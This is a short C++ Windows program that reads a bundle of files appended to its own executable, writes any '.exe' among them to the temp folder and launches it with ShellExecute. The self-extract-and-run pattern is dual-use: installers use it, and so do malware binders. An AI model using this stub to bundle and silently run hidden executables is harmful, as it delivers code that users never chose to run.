#include <iostream>
#include <fstream>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <limits.h>
#include <windows.h>
#include "MyFile.h"

using namespace std;

int main(int argc, char** argv)
{
    char buf[MAX_PATH];
    if (GetTempPath (MAX_PATH, buf) == 0)
    {
        cout << "error\n";
        return -1;
    }
    cout << argv[0] << endl;
    ifstream fin(argv[0], ios::in | ios::binary);
    int size;
    fin.seekg(-4, fin.end);
    cout << fin.tellg() << endl;
    fin.read((char*)&size, sizeof(size));
    cout << "size: " << size << endl;
    fin.seekg(-(size+4), ios::cur);
    cout << "fin.tellg: " << fin.tellg() << endl;
    MyFile a;
    while(fin >> a)
    {
        cout << a.filename << endl;
        cout << a.length << endl;
        cout << (int)a.data[0] << endl;
        string tmp_file = buf;
        bool exe = false;
        ofstream fout;
        if(a.filename.length() >= 3 && a.filename.substr(a.filename.length() - 3).compare("exe") == 0)
        {
            cout << "Got exe\n";
            tmp_file += a.filename;
            cout << "temp_file: " << tmp_file << endl;
            exe = true;
            fout.open(tmp_file.c_str(), ios::out | ios::binary);
        }
        else
        {
            fout.open(a.filename.c_str(), ios::out | ios::binary);
        }
        fout.write(a.data, a.length);
        fout.close();
        if(exe)
        {
            cout << "exeing: " << tmp_file << endl;
            HINSTANCE hReturnCode=ShellExecute(NULL, "open", tmp_file.c_str(), NULL, NULL, SW_SHOWNORMAL);
        }
    }
    return 0;
}
